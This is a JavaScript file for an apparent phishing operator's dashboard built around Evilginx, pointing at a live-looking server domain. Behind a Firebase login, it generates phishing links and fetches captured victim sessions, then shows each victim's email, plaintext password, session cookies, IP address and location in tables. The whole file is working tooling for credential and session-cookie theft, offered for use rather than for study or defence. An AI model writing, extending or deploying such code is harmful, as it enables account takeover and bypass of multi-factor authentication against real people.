console.log("✅ Script.js loaded successfully");

// Evilginx Server Configuration
const EVILGINX_SERVER = "http://tecan.com.co:5000"; // Update with your actual Evilginx domain

// Wait for Firebase to load before using it
document.addEventListener("DOMContentLoaded", () => {
    if (typeof firebase === "undefined") {
        console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
        return;
    }

    checkAuthStatus();
});

// ✅ Check User Authentication & Redirect If Necessary
function checkAuthStatus() {
    firebase.auth().onAuthStateChanged(user => {
        if (user) {
            console.log("✅ User is logged in:", user.email);
            if (window.location.pathname.includes("index.html")) {
                window.location.href = "dashboard.html"; // Redirect to dashboard if logged in
            }
        } else {
            console.log("❌ User not logged in.");
            if (window.location.pathname.includes("dashboard.html")) {
                window.location.href = "index.html"; // Redirect to login page if not authenticated
            }
        }
    });
}

// ✅ Login Function
function login() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    firebase.auth().signInWithEmailAndPassword(email, password)
        .then(userCredential => {
            console.log("✅ Login successful:", userCredential.user.email);
            window.location.href = "dashboard.html"; // Redirect to dashboard
        })
        .catch(error => {
            console.error("❌ Login failed:", error.message);
            alert("Login failed: " + error.message);
        });
}

// ✅ Logout Function
function logout() {
    firebase.auth().signOut().then(() => {
        console.log("✅ User logged out.");
        window.location.href = "index.html"; // Redirect to login page
    }).catch(error => {
        console.error("❌ Logout failed:", error.message);
    });
}

// ✅ Generate Evilginx Phishing Link
function generateLink() {
    fetch(`${EVILGINX_SERVER}/generate_link`)
        .then(response => response.json())
        .then(data => {
            if (data.link) {
                document.getElementById("generatedLink").innerText = `Generated Link: ${data.link}`;
                console.log("✅ Link generated successfully:", data.link);
            } else {
                console.error("❌ Error generating link:", data);
                alert("Failed to generate link.");
            }
        })
        .catch(error => {
            console.error("❌ Error generating link:", error);
            alert("Error generating link. Check server status.");
        });
}

// ✅ Fetch Captured Sessions from Evilginx
function fetchCapturedSessions() {
    fetch(`${EVILGINX_SERVER}/captured_sessions`)
        .then(response => response.json())
        .then(data => {
            const table = document.getElementById("sessionsTableBody");
            table.innerHTML = ""; // Clear previous data

            data.sessions.forEach(session => {
                let row = `<tr>
                    <td>${session.email}</td>
                    <td>${session.password}</td>
                    <td>${session.cookies}</td>
                    <td>${session.ip}</td>
                </tr>`;
                table.innerHTML += row;
            });

            console.log("✅ Captured sessions updated.");
        })
        .catch(error => {
            console.error("❌ Error fetching sessions:", error);
            alert("Failed to fetch captured sessions.");
        });
}

// ✅ Fetch Generated Links History
function fetchGeneratedLinks() {
    fetch(`${EVILGINX_SERVER}/generated_links`)
        .then(response => response.json())
        .then(data => {
            const table = document.getElementById("linksTableBody");
            table.innerHTML = ""; // Clear previous data

            data.links.forEach(link => {
                let row = `<tr>
                    <td>${link.generated_link}</td>
                    <td>${link.location}</td>
                    <td>${link.ip}</td>
                </tr>`;
                table.innerHTML += row;
            });

            console.log("✅ Generated links updated.");
        })
        .catch(error => {
            console.error("❌ Error fetching links:", error);
            alert("Failed to fetch generated links.");
        });
}

// ✅ Auto-fetch Data on Dashboard Load
if (window.location.pathname.includes("dashboard.html")) {
    document.addEventListener("DOMContentLoaded", () => {
        fetchCapturedSessions();
        fetchGeneratedLinks();
    });
}
